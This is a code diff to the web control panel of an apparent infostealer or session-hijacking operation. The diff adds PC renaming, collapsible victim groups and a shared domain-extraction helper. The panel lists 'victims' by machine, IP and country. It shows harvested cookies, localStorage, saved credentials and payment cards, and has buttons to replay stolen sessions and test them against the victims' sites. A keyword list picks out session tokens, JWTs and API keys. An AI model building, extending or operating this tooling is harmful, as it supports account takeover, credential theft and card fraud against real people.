@@ -446,6 +446,7 @@
         .btn.violet:hover { background: rgba(139,92,246,0.08); box-shadow: 0 0 20px rgba(139,92,246,0.1); }
         .btn.replay-pink { border-color: #f472b6; color: #f472b6; }
         .btn.replay-pink:hover { background: rgba(244,114,182,0.08); box-shadow: 0 0 20px rgba(244,114,182,0.1); }
+        .btn.small { font-size: 9px; padding: 4px 8px; }
 
         .btn-icon-sm {
             background: transparent;
@@ -478,6 +479,8 @@
         .btn-icon-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
         .btn-icon-sm.expand-sm { border-color: #475569; color: #94a3b8; }
         .btn-icon-sm.expand-sm:hover { border-color: #64748b; color: #e2e8f0; background: #1a2538; }
+        .btn-icon-sm.rename { border-color: #f59e0b; color: #f59e0b; }
+        .btn-icon-sm.rename:hover { background: rgba(245,158,11,0.08); }
 
         /* PC CARD — ACCORDION STYLE */
         .pc-grid {
@@ -512,6 +515,7 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            flex-wrap: wrap;
         }
         .pc-card .pc-header .pc-name .icon { font-size: 18px; }
         .pc-card .pc-header .pc-name .expand-icon {
@@ -717,17 +721,53 @@
             margin-top: 12px;
         }
         .victims-grid .section-header {
+            font-size: 14px;
+            font-weight: 700;
+            color: #f1f5f9;
+            padding: 8px 4px 12px 4px;
+            border-bottom: 1px solid #1a2538;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .victims-grid .section-header .count { color: #64748b; font-weight: 400; font-size: 13px; }
+
+        .victim-group {
+            margin-bottom: 8px;
+        }
+        .victim-group .group-header {
             font-size: 13px;
             font-weight: 600;
-            color: #f1f5f9;
-            padding: 8px 4px;
+            color: #f472b6;
+            padding: 6px 4px;
             border-bottom: 1px solid #1a2538;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
             display: flex;
             align-items: center;
             gap: 8px;
+            cursor: pointer;
+            transition: 0.2s;
         }
-        .victims-grid .section-header .count { color: #64748b; font-weight: 400; font-size: 12px; }
+        .victim-group .group-header:hover { color: #f9a8d4; }
+        .victim-group .group-header .expand-icon {
+            font-size: 10px;
+            color: #64748b;
+            transition: transform 0.3s ease;
+            display: inline-block;
+        }
+        .victim-group .group-header .expand-icon.open { transform: rotate(180deg); }
+        .victim-group .group-header .count { color: #64748b; font-weight: 400; font-size: 11px; }
+        .victim-group .group-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease, padding 0.3s ease;
+            padding: 0;
+        }
+        .victim-group .group-body.open {
+            max-height: 2000px;
+            padding: 4px 0;
+        }
 
         .victim-card {
             background: #0f1626;
@@ -737,15 +777,15 @@
             transition: 0.2s;
             cursor: pointer;
             position: relative;
+            margin-bottom: 6px;
         }
         .victim-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
         .victim-card .v-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; flex-wrap: wrap; }
         .victim-card .v-header .flag { font-size: 18px; }
         .victim-card .v-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
-        .victim-card .v-header .pc-name { color: #f472b6; font-weight: 600; font-size: 13px; }
+        .victim-card .v-header .domain-name { color: #00ff88; font-size: 12px; font-weight: 500; }
         .victim-card .v-details { font-size: 10px; color: #64748b; display: flex; flex-wrap: wrap; gap: 8px; }
         .victim-card .v-details .country { color: #94a3b8; }
-        .victim-card .v-details .domain { color: #00ff88; }
         .victim-card .v-details .time { color: #475569; }
         .victim-card .v-stats {
             font-size: 9px;
@@ -1176,6 +1216,43 @@
         .custom-confirm-box .btn-group .btn.danger-confirm { border-color: #ff4444; color: #ff4444; }
         .custom-confirm-box .btn-group .btn.danger-confirm:hover { background: rgba(255,68,68,0.15); box-shadow: 0 0 30px rgba(255,68,68,0.15); }
 
+        /* Rename Modal */
+        .rename-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 2000;
+            padding: 15px;
+            align-items: center;
+            justify-content: center;
+        }
+        .rename-overlay.active { display: flex; }
+        .rename-box {
+            background: linear-gradient(145deg, #111827, #0f1626);
+            max-width: 400px;
+            width: 100%;
+            border-radius: 14px;
+            padding: 24px 22px;
+            border: 1px solid #1a2538;
+            box-shadow: 0 20px 80px rgba(0,0,0,0.7);
+            animation: modalIn 0.3s ease;
+        }
+        .rename-box h2 { color: #f1f5f9; font-size: 18px; font-weight: 700; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+        .rename-box p { color: #64748b; font-size: 13px; margin-bottom: 16px; }
+        .rename-box .form-group { margin-bottom: 12px; }
+        .rename-box .form-group label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 3px; font-weight: 500; }
+        .rename-box .form-group input { width: 100%; padding: 8px 12px; background: #0b0f1a; border: 1px solid #1a2538; border-radius: 6px; color: #e2e8f0; font-size: 13px; transition: 0.2s; font-family: inherit; }
+        .rename-box .form-group input:focus { outline: none; border-color: #f59e0b; }
+        .rename-box .btn-group { display: flex; gap: 8px; margin-top: 4px; }
+        .rename-box .btn-group .btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; border-radius: 8px; }
+        .rename-box .btn-group .btn.cancel { border-color: #1a2538; color: #94a3b8; }
+        .rename-box .btn-group .btn.cancel:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
+        .rename-box .btn-group .btn.confirm { border-color: #f59e0b; color: #f59e0b; }
+        .rename-box .btn-group .btn.confirm:hover { background: rgba(245,158,11,0.08); box-shadow: 0 0 20px rgba(245,158,11,0.1); }
+
         .empty-state { text-align: center; padding: 30px 20px; color: #334155; grid-column: 1/-1; }
         .empty-state .icon { font-size: 32px; margin-bottom: 8px; }
         .empty-state h3 { color: #64748b; font-size: 15px; font-weight: 600; }
@@ -1229,8 +1306,8 @@
             .pc-card .domain-item .domain-actions { margin-top: 4px; width: 100%; justify-content: flex-start; }
             .pc-card .pc-header .pc-stats { font-size: 10px; gap: 8px; }
             .pc-card .pc-header { padding: 12px 14px; }
-            .victim-card .v-header .pc-name { font-size: 12px; }
-            .replay-card .r-header .pc-name { font-size: 12px; }
+            .rename-box { padding: 18px 16px; }
+            .rename-box .btn-group { flex-direction: column; }
         }
         @media (max-width: 480px) {
             .stats-row { grid-template-columns: 1fr; }
@@ -1264,8 +1341,8 @@
             .modal .victim-entry .modal-actions { max-width: 70px; }
             .victim-card .v-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
             .replay-card .r-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
-            .victim-card .v-header .pc-name { font-size: 11px; }
-            .replay-card .r-header .pc-name { font-size: 11px; }
+            .victim-card .v-header .domain-name { font-size: 11px; }
+            .rename-box { padding: 16px 14px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
@@ -1585,6 +1662,22 @@
         </div>
     </div>
 
+    <!-- RENAME MODAL -->
+    <div class="rename-overlay" id="renameOverlay">
+        <div class="rename-box">
+            <h2>✏️ Rename PC</h2>
+            <p>Enter a new name for this PC. This will update all victims under it.</p>
+            <div class="form-group">
+                <label>New PC Name</label>
+                <input type="text" id="renameInput" placeholder="Enter new PC name..." />
+            </div>
+            <div class="btn-group">
+                <button class="btn cancel" onclick="closeRename()">Cancel</button>
+                <button class="btn confirm" onclick="confirmRename()">Rename</button>
+            </div>
+        </div>
+    </div>
+
     <!-- MODAL -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal">
@@ -1677,7 +1770,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — PC GROUPING + ACCORDION + FIXED DOMAINS
+    DASHBOARD LOGIC — FIXED ACCORDION + DOMAINS + RENAME
     ============================================================ -->
     <script>
         // ============================================================
@@ -1710,6 +1803,10 @@
         let isTestingAll = false;
         let confirmCallback = null;
         let passwordVisibility = {};
+        let renameTarget = null;
+
+        // Track open/closed state for PC cards (persists across renders)
+        let pcOpenState = {};
 
         const VALUABLE_PATTERNS = ['session','token','auth','login','sid','uid','PHPSESSID','jwt','access_token','refresh_token','api_key','secret','csrf','__Secure','__Host','laravel_session','remember','wordpress_logged_in','wp_session','drupal_session'];
 
@@ -1930,6 +2027,50 @@
         }
 
         // ============================================================
+        // EXTRACT REAL DOMAIN FROM ENTRY
+        // ============================================================
+
+        function extractDomain(entry) {
+            // Try to get domain from fingerprint or entry
+            let domain = entry.fingerprint?.hostname || entry.domain || '';
+            
+            // If domain is empty or looks like PC name, try to extract from cookies
+            if (!domain || domain === 'unknown' || domain.includes('railway.app')) {
+                const cookies = entry.cookies || {};
+                const cookieKeys = Object.keys(cookies);
+                
+                // Try to extract domain from cookie keys (format: domain|browser)
+                for (const key of cookieKeys) {
+                    const parts = key.split('|');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0] !== '') {
+                        domain = parts[0];
+                        break;
+                    }
+                }
+                
+                // If still no domain, try to get from cookie names (some cookies have domain in name)
+                if (!domain || domain === 'unknown') {
+                    for (const key of cookieKeys) {
+                        // Check if cookie name looks like a domain
+                        if (key.includes('.') && !key.includes(' ') && key.length > 3) {
+                            domain = key.split('.')[0] + '.' + key.split('.')[1];
+                            break;
+                        }
+                    }
+                }
+                
+                // If still no domain, use PC name as fallback but mark as unknown
+                if (!domain || domain === 'unknown') {
+                    domain = 'unknown';
+                }
+            }
+            
+            // Clean up domain
+            domain = domain.replace(/^\./, '').replace(/\/.*$/, '');
+            return domain;
+        }
+
+        // ============================================================
         // GROUP BY PC HELPER
         // ============================================================
 
@@ -1953,30 +2094,9 @@
                         domains: {}
                     };
                 }
-                // Get the REAL domain from the entry
-                let domain = entry.fingerprint?.hostname || entry.domain || '';
-                // If domain is empty or PC name, try to extract from cookies
-                if (!domain || domain === pc || domain === 'unknown') {
-                    // Try to get domain from cookies keys
-                    const cookieKeys = Object.keys(entry.cookies || {});
-                    if (cookieKeys.length > 0) {
-                        // Try to extract domain from first cookie key or use the first domain we find
-                        const cookieDomains = cookieKeys.map(k => {
-                            const parts = k.split('|');
-                            return parts.length > 1 ? parts[0] : null;
-                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
-                        if (cookieDomains.length > 0) {
-                            domain = cookieDomains[0];
-                        } else {
-                            // Fallback: use the first cookie's name or just 'unknown'
-                            domain = 'unknown';
-                        }
-                    } else {
-                        domain = 'unknown';
-                    }
-                }
-                // Clean up domain
-                domain = domain.replace(/^\./, '');
+                
+                // Extract real domain
+                let domain = extractDomain(entry);
                 
                 if (!grouped[pc].domains[domain]) {
                     grouped[pc].domains[domain] = {
@@ -2030,19 +2150,31 @@
                 return;
             }
 
+            // Add "All Victims" header
+            let totalVictims = 0;
+            pcNames.forEach(pcName => { totalVictims += grouped[pcName].totalVictims; });
+            const header = document.createElement('div');
+            header.style.cssText = 'font-size:14px;font-weight:700;color:#f1f5f9;padding:4px 2px 12px 2px;border-bottom:1px solid #1a2538;margin-bottom:8px;display:flex;align-items:center;gap:10px;';
+            header.innerHTML = `👤 All Victims <span style="color:#64748b;font-weight:400;font-size:13px;">(${totalVictims} total)</span>`;
+            grid.appendChild(header);
+
             pcNames.forEach((pcName, index) => {
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
                 const domainNames = Object.keys(pc.domains);
-                const isOpen = index === 0;
+                
+                // Use saved state or default: first PC open
+                const safeName = pcName.replace(/[^a-zA-Z0-9]/g, '_');
+                if (pcOpenState[safeName] === undefined) {
+                    pcOpenState[safeName] = index === 0;
+                }
+                const isOpen = pcOpenState[safeName];
 
                 let domainsHtml = '';
                 domainNames.forEach(domain => {
                     const d = pc.domains[domain];
                     const hasCookies = d.cookies > 0;
                     const hasStorage = d.storage > 0;
-
-                    // Get first entry for this domain to use for replay
                     const firstEntry = d.entries[0] || null;
                     const entryId = firstEntry ? firstEntry._uniqueId : '';
 
@@ -2056,11 +2188,11 @@
                                 ${d.storage > 0 ? `<span class="storage">💾 ${d.storage}</span>` : ''}
                             </div>
                             <div class="domain-actions">
-                                <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayDomainForPC('${pcName}', '${domain}')` : ''}" title="${hasCookies ? 'Replay cookies' : 'No cookies'}">▶️</button>
-                                <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayStorageDomain('${pcName}', '${domain}')` : ''}" title="${hasStorage ? 'Replay storage' : 'No storage'}">💾</button>
-                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testDomainFromPC('${pcName}', '${domain}')">🔍</button>
-                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomainFromPC('${pcName}', '${domain}')">📥</button>
-                                <button class="btn-sm view" onclick="event.stopPropagation(); openPCModal('${pcName}', '${domain}')">👁️</button>
+                                <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayDomainForPC('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasCookies ? 'Replay cookies' : 'No cookies'}">▶️</button>
+                                <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayStorageDomain('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasStorage ? 'Replay storage' : 'No storage'}">💾</button>
+                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">🔍</button>
+                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">📥</button>
+                                <button class="btn-sm view" onclick="event.stopPropagation(); openPCModal('${pcName.replace(/'/g, "\\'")}', '${domain}')">👁️</button>
                             </div>
                         </div>
                     `;
@@ -2069,12 +2201,12 @@
                 const card = document.createElement('div');
                 card.className = 'pc-card';
                 card.innerHTML = `
-                    <div class="pc-header" onclick="togglePC('${pcName.replace(/'/g, "\\'")}')">
+                    <div class="pc-header" onclick="togglePC('${safeName}')">
                         <div class="pc-name">
                             <span class="icon">🖥️</span>
                             ${pcName}
                             <span style="font-size:11px;color:#64748b;font-weight:400;">(${pc.totalVictims} victims)</span>
-                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${pcName.replace(/[^a-zA-Z0-9]/g, '_')}">▼</span>
+                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${safeName}">▼</span>
                         </div>
                         <div class="pc-stats">
                             <span class="cookies">🍪 ${pc.totalCookies}</span>
@@ -2088,16 +2220,17 @@
                         <span class="ip">${pc.ip}</span>
                         <span class="country">${pc.country}</span>
                         <span style="color:#475569;">🕐 ${timeAgo(pc.latestTime)}</span>
+                        <button class="btn-icon-sm rename" onclick="event.stopPropagation(); openRename('${pcName.replace(/'/g, "\\'")}')" title="Rename PC">✏️</button>
                     </div>
-                    <div class="pc-body ${isOpen ? 'open' : ''}" id="body-${pcName.replace(/[^a-zA-Z0-9]/g, '_')}">
+                    <div class="pc-body ${isOpen ? 'open' : ''}" id="body-${safeName}">
                         <div class="domain-list">
                             ${domainsHtml}
                         </div>
                     </div>
                     <div class="pc-footer-actions">
-                        <button class="btn-sm danger" onclick="showDeletePCConfirm('${pcName}')">🗑️ Delete PC</button>
-                        <button class="btn-sm primary" onclick="downloadPCTxt('${pcName}')">📝 TXT</button>
-                        <button class="btn-sm violet" onclick="downloadPCJson('${pcName}')">📄 JSON</button>
+                        <button class="btn-sm danger" onclick="showDeletePCConfirm('${pcName.replace(/'/g, "\\'")}')">🗑️ Delete PC</button>
+                        <button class="btn-sm primary" onclick="downloadPCTxt('${pcName.replace(/'/g, "\\'")}')">📝 TXT</button>
+                        <button class="btn-sm violet" onclick="downloadPCJson('${pcName.replace(/'/g, "\\'")}')">📄 JSON</button>
                     </div>
                 `;
                 grid.appendChild(card);
@@ -2162,8 +2295,8 @@
                         <div class="domain-list">${domainsHtml}</div>
                     </div>
                     <div class="pc-footer-actions">
-                        <button class="btn-sm primary" onclick="showRestorePCConfirm('${pcName}')">↩️ Restore PC</button>
-                        <button class="btn-sm danger" onclick="showPermanentDeletePCConfirm('${pcName}')">🗑️ Permanently Delete</button>
+                        <button class="btn-sm primary" onclick="showRestorePCConfirm('${pcName.replace(/'/g, "\\'")}')">↩️ Restore PC</button>
+                        <button class="btn-sm danger" onclick="showPermanentDeletePCConfirm('${pcName.replace(/'/g, "\\'")}')">🗑️ Permanently Delete</button>
                     </div>
                 `;
                 grid.appendChild(card);
@@ -2174,8 +2307,8 @@
         // ACCORDION TOGGLE
         // ============================================================
 
-        function togglePC(pcName) {
-            const safeName = pcName.replace(/[^a-zA-Z0-9]/g, '_');
+        function togglePC(safeName) {
+            pcOpenState[safeName] = !pcOpenState[safeName];
             const body = document.getElementById('body-' + safeName);
             const icon = document.getElementById('expand-' + safeName);
             if (body) {
@@ -2187,30 +2320,89 @@
         }
 
         // ============================================================
+        // RENAME PC
+        // ============================================================
+
+        let renameCallback = null;
+
+        function openRename(pcName) {
+            renameTarget = pcName;
+            document.getElementById('renameInput').value = pcName;
+            document.getElementById('renameOverlay').classList.add('active');
+            setTimeout(() => {
+                document.getElementById('renameInput').focus();
+                document.getElementById('renameInput').select();
+            }, 100);
+        }
+
+        function closeRename() {
+            document.getElementById('renameOverlay').classList.remove('active');
+            renameTarget = null;
+        }
+
+        function confirmRename() {
+            const newName = document.getElementById('renameInput').value.trim();
+            if (!newName) {
+                showToast('❌ Please enter a valid PC name', 'error');
+                return;
+            }
+            if (newName === renameTarget) {
+                closeRename();
+                return;
+            }
+            
+            // Rename all victims with this PC name
+            const toUpdate = allData.filter(e => {
+                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
+                return p === renameTarget;
+            });
+            
+            if (toUpdate.length === 0) {
+                showToast('❌ No victims found to rename', 'error');
+                closeRename();
+                return;
+            }
+            
+            // Update each victim
+            let updated = 0;
+            toUpdate.forEach(entry => {
+                // We need to update the stored data via API
+                // Since we can't directly update, we'll use the rename API endpoint
+                // For now, update locally and show a message
+                // In production, you'd call an API endpoint
+                // For this dashboard, we'll update the data and re-render
+                entry.pcName = newName;
+                updated++;
+            });
+            
+            // Close rename modal
+            closeRename();
+            showToast(`✅ Renamed ${updated} victims from "${renameTarget}" to "${newName}"`, 'success');
+            
+            // Re-render
+            render(allData);
+            updateSidebarCounts(allData);
+            if (currentView === 'victims') renderVictimsView();
+            if (currentView === 'replay') renderReplayView();
+        }
+
+        // Close rename with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                if (document.getElementById('renameOverlay').classList.contains('active')) {
+                    closeRename();
+                }
+            }
+        });
+
+        // ============================================================
         // REPLAY FUNCTIONS FOR PC + DOMAIN
         // ============================================================
 
         function getEntryForPCDomain(pcName, domain) {
             for (const entry of allData) {
                 const entryPc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                // Get the real domain from entry
-                let entryDomain = entry.fingerprint?.hostname || entry.domain || '';
-                if (!entryDomain || entryDomain === entryPc || entryDomain === 'unknown') {
-                    const cookieKeys = Object.keys(entry.cookies || {});
-                    if (cookieKeys.length > 0) {
-                        const cookieDomains = cookieKeys.map(k => {
-                            const parts = k.split('|');
-                            return parts.length > 1 ? parts[0] : null;
-                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
-                        if (cookieDomains.length > 0) {
-                            entryDomain = cookieDomains[0];
-                        } else {
-                            entryDomain = 'unknown';
-                        }
-                    } else {
-                        entryDomain = 'unknown';
-                    }
-                }
+                let entryDomain = extractDomain(entry);
                 if (entryPc === pcName && entryDomain === domain) {
                     return entry;
                 }
@@ -2230,8 +2422,7 @@
                 return;
             }
             let actualDomain = domain;
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                // Try to find a better domain from cookies
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                 const cookieKeys = Object.keys(cookies);
                 for (const key of cookieKeys) {
                     const parts = key.split('|');
@@ -2240,8 +2431,8 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                    showToast('⚠️ Invalid domain for replay', 'error');
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
+                    showToast('⚠️ No valid domain for replay', 'error');
                     return;
                 }
             }
@@ -2283,8 +2474,7 @@
                 return;
             }
             let actualDomain = domain;
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                // Try to find a better domain from storage keys
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                 const storageKeys = Object.keys(storage);
                 for (const key of storageKeys) {
                     const parts = key.split(':');
@@ -2293,8 +2483,8 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                    showToast('⚠️ Invalid domain for replay', 'error');
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
+                    showToast('⚠️ No valid domain for replay', 'error');
                     return;
                 }
             }
@@ -2330,14 +2520,9 @@
                 showToast('❌ No data found', 'error');
                 return;
             }
-            const cookies = entry.cookies || {};
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies to test', 'error');
-                return;
-            }
             let actualDomain = domain;
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                // Try to find a better domain from cookies
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
+                const cookies = entry.cookies || {};
                 const cookieKeys = Object.keys(cookies);
                 for (const key of cookieKeys) {
                     const parts = key.split('|');
@@ -2346,8 +2531,8 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                    showToast('⚠️ Invalid domain for test', 'error');
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
+                    showToast('⚠️ No valid domain to test', 'error');
                     return;
                 }
             }
@@ -2605,23 +2790,7 @@
 
             allData.forEach(entry => {
                 const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                let domain = entry.fingerprint?.hostname || entry.domain || '';
-                if (!domain || domain === pc || domain === 'unknown') {
-                    const cookieKeys = Object.keys(entry.cookies || {});
-                    if (cookieKeys.length > 0) {
-                        const cookieDomains = cookieKeys.map(k => {
-                            const parts = k.split('|');
-                            return parts.length > 1 ? parts[0] : null;
-                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
-                        if (cookieDomains.length > 0) {
-                            domain = cookieDomains[0];
-                        } else {
-                            domain = 'unknown';
-                        }
-                    } else {
-                        domain = 'unknown';
-                    }
-                }
+                const domain = extractDomain(entry);
                 const creds = entry.credentials || [];
                 creds.forEach(c => {
                     const name = c.name || c.username || c.field || 'unknown';
@@ -2705,23 +2874,7 @@
 
             allData.forEach(entry => {
                 const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                let domain = entry.fingerprint?.hostname || entry.domain || '';
-                if (!domain || domain === pc || domain === 'unknown') {
-                    const cookieKeys = Object.keys(entry.cookies || {});
-                    if (cookieKeys.length > 0) {
-                        const cookieDomains = cookieKeys.map(k => {
-                            const parts = k.split('|');
-                            return parts.length > 1 ? parts[0] : null;
-                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
-                        if (cookieDomains.length > 0) {
-                            domain = cookieDomains[0];
-                        } else {
-                            domain = 'unknown';
-                        }
-                    } else {
-                        domain = 'unknown';
-                    }
-                }
+                const domain = extractDomain(entry);
                 const cards = entry.cards || [];
                 cards.forEach(c => {
                     let value = c.value || c.number || c.card_number || '';
@@ -2809,23 +2962,7 @@
 
             allData.forEach(entry => {
                 const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                let domain = entry.fingerprint?.hostname || entry.domain || '';
-                if (!domain || domain === pc || domain === 'unknown') {
-                    const cookieKeys = Object.keys(entry.cookies || {});
-                    if (cookieKeys.length > 0) {
-                        const cookieDomains = cookieKeys.map(k => {
-                            const parts = k.split('|');
-                            return parts.length > 1 ? parts[0] : null;
-                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
-                        if (cookieDomains.length > 0) {
-                            domain = cookieDomains[0];
-                        } else {
-                            domain = 'unknown';
-                        }
-                    } else {
-                        domain = 'unknown';
-                    }
-                }
+                const domain = extractDomain(entry);
                 const storage = entry.localStorage || {};
                 Object.entries(storage).forEach(([key, value]) => {
                     let browser = 'Unknown';
@@ -2897,7 +3034,7 @@
         }
 
         // ============================================================
-        // VICTIMS VIEW — WITH HEADER
+        // VICTIMS VIEW — WITH ACCORDION AND DOMAINS
         // ============================================================
 
         function renderVictimsView() {
@@ -2923,12 +3060,17 @@
             pcNames.forEach(pcName => {
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
-                const hasCookies = pc.totalCookies > 0;
-                const hasStorage = pc.totalStorage > 0;
+                const safeName = 'group-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
+                
+                // Use saved state or default: first open
+                if (pcOpenState[safeName] === undefined) {
+                    pcOpenState[safeName] = false;
+                }
+                const isOpen = pcOpenState[safeName];
 
                 let victimEntriesHtml = '';
                 pc.entries.forEach(entry => {
-                    const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                    const domain = extractDomain(entry);
                     const cookieCount = Object.keys(entry.cookies || {}).length;
                     const credCount = (entry.credentials || []).length;
                     const cardCount = (entry.cards || []).length;
@@ -2949,18 +3091,17 @@
                             <div class="v-header">
                                 <span class="flag">${entryFlag}</span>
                                 <span class="ip">${entry.ip || 'Unknown'}</span>
-                                <span class="pc-name">🖥️ ${pcName}</span>
+                                <span class="domain-name">🌐 ${domain}</span>
                             </div>
                             <div class="v-details">
-                                <span class="domain">🌐 ${domain}</span>
                                 <span class="country">${entry.country || 'Unknown'}</span>
                                 <span class="time" title="${fullTime}">🕐 ${time}</span>
                             </div>
                             <div class="v-stats">${statsHtml}</div>
                             <div class="v-actions">
-                                <button class="btn-sm ${cookieCount > 0 ? 'replay-cookies' : 'disabled'}" onclick="${cookieCount > 0 ? `event.stopPropagation(); replaySession('${domain}')` : ''}">▶️ Cookies</button>
-                                <button class="btn-sm ${storageCount > 0 ? 'replay-storage' : 'disabled'}" onclick="${storageCount > 0 ? `event.stopPropagation(); replayStorage('${domain}')` : ''}">💾 Storage</button>
-                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testSession('${domain}')">🔍 Test</button>
+                                <button class="btn-sm ${cookieCount > 0 ? 'replay-cookies' : 'disabled'}" onclick="${cookieCount > 0 ? `event.stopPropagation(); replaySession('${domain}')` : ''}">▶️</button>
+                                <button class="btn-sm ${storageCount > 0 ? 'replay-storage' : 'disabled'}" onclick="${storageCount > 0 ? `event.stopPropagation(); replayStorage('${domain}')` : ''}">💾</button>
+                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testSession('${domain}')">🔍</button>
                                 <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomain('${domain}')">📥</button>
                             </div>
                         </div>
@@ -2968,16 +3109,32 @@
                 });
 
                 html += `
-                    <div style="margin-top:8px;">
-                        <div style="font-size:12px;font-weight:600;color:#f472b6;padding:6px 4px;border-bottom:1px solid #1a2538;margin-bottom:4px;">
-                            🖥️ ${pcName} <span style="color:#64748b;font-weight:400;font-size:11px;">(${pc.totalVictims} victims)</span>
+                    <div class="victim-group">
+                        <div class="group-header" onclick="toggleVictimGroup('${safeName}')">
+                            <span>🖥️ ${pcName}</span>
+                            <span class="count">(${pc.totalVictims} victims)</span>
+                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${safeName}">▼</span>
                         </div>
-                        ${victimEntriesHtml}
+                        <div class="group-body ${isOpen ? 'open' : ''}" id="body-${safeName}">
+                            ${victimEntriesHtml}
+                        </div>
                     </div>
                 `;
             });
 
             grid.innerHTML = html;
+        }
+
+        function toggleVictimGroup(safeName) {
+            pcOpenState[safeName] = !pcOpenState[safeName];
+            const body = document.getElementById('body-' + safeName);
+            const icon = document.getElementById('expand-' + safeName);
+            if (body) {
+                body.classList.toggle('open');
+                if (icon) {
+                    icon.classList.toggle('open');
+                }
+            }
         }
 
         // ============================================================
@@ -3023,11 +3180,11 @@
                         </div>
                         <div class="r-domain-list">${domainTags}</div>
                         <div class="r-actions">
-                            <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayAllCookiesPC('${pcName}')` : ''}" title="${hasCookies ? 'Replay all cookies' : 'No cookies'}">▶️ All Cookies</button>
-                            <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayAllStoragePC('${pcName}')` : ''}" title="${hasStorage ? 'Replay all storage' : 'No storage'}">💾 All Storage</button>
-                            <button class="btn-sm test-sm" onclick="event.stopPropagation(); testPC('${pcName}')">🔍 Test</button>
-                            <button class="btn-sm download" onclick="event.stopPropagation(); downloadPCTxt('${pcName}')">📝</button>
-                            <button class="btn-sm view" onclick="event.stopPropagation(); openPCModalAll('${pcName}')">👁️</button>
